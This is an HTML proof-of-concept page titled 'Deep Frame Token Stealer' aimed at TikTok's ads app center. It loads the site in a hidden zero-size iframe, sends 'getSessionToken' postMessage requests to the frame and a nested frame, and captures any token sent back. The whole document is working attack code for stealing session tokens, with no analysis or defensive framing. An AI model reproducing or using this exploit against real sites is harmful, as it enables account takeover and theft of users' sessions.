<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Deep Frame Token Stealer</title>
</head>
<body>
    <iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:0;height:0;border:0;"></iframe>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            const iframe = document.getElementById('victim');

            iframe.onload = function () {
                const outerFrame = iframe.contentWindow;

                // Try outer frame first
                outerFrame.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');

                // Try nested frames inside the iframe
                setTimeout(() => {
                    try {
                        const innerFrame = outerFrame.frames[0]; // First nested frame
                        if (innerFrame) {
                            innerFrame.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
                        }
                    } catch (e) {
                        console.error('Could not access nested frame:', e);
                    }
                }, 1000); // Give it some time to fully load nested frames
            };

            // Capture any token coming back from any frame
            window.addEventListener('message', (e) => {
                if (e.origin === 'https://ads.tiktok.com') {
                    console.log('Token received from nested frame:', e.data);
                }
            });
        });
    </script>
</body>
</html>
